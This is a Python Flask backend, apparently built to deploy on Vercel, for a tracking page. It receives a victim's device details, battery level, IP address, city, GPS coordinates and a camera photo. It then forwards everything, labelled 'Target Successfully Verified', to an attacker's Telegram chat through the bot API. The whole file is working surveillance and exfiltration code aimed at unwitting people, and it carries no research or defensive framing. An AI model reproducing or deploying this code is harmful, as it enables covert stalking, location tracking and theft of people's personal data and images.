import os
import base64
import requests
from flask import Flask, render_template, request, jsonify
from datetime import datetime

app = Flask(__name__, template_folder='../templates')

# Environment Variables (Vercel Settings mein add karein)
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

def push_telegram(message, photo_data=None):
    """Reliable Telegram Delivery System"""
    base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    
    try:
        # Send Text Report
        requests.post(base_url + "sendMessage", data={
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
            "disable_web_page_preview": False
        }, timeout=10)
        
        # Send Photo if available
        if photo_data:
            img_bytes = base64.b64decode(photo_data.split(",")[1])
            files = {'photo': ('target_capture.jpg', img_bytes, 'image/jpeg')}
            requests.post(base_url + "sendPhoto", data={"chat_id": CHAT_ID}, files=files, timeout=15)
            
    except Exception as e:
        print(f"Telegram Push Error: {e}")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture_handler():
    try:
        payload = request.get_json()
        if not payload:
            return jsonify({"status": "empty_payload"}), 400

        info = payload.get('info', {})
        photo = payload.get('photo')
        
        # Accurate Maps Link Construction
        latitude = info.get('lat', '0')
        longitude = info.get('lon', '0')
        google_maps = f"https://www.google.com/maps?q={latitude},{longitude}"
        
        # Professional Telegram Report Template
        report = (
            f"⚡ <b>Target Successfully Verified</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Device Info:</b>\n"
            f"• Model: <code>{info.get('device')}</code>\n"
            f"• OS: {info.get('platform')}\n"
            f"• Battery: <b>{info.get('battery')}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🌍 <b>Geographic Data:</b>\n"
            f"• City: {info.get('city')}\n"
            f"• Country: {info.get('country')}\n"
            f"• Real IP: <code>{info.get('ip')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📍 <b>Live Tracking:</b>\n"
            f"<a href='{google_maps}'>📍 View on Google Maps</a>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏰ <b>Timestamp:</b> {info.get('time')}\n"
            f"🛰 <b>Status:</b> High-Precision Success"
        )

        push_telegram(report, photo)
        return jsonify({"status": "success"}), 200

    except Exception as e:
        return jsonify({"status": "internal_failure", "error": str(e)}), 500

if __name__ == "__main__":
    # Local testing only
    app.run(debug=True)
    
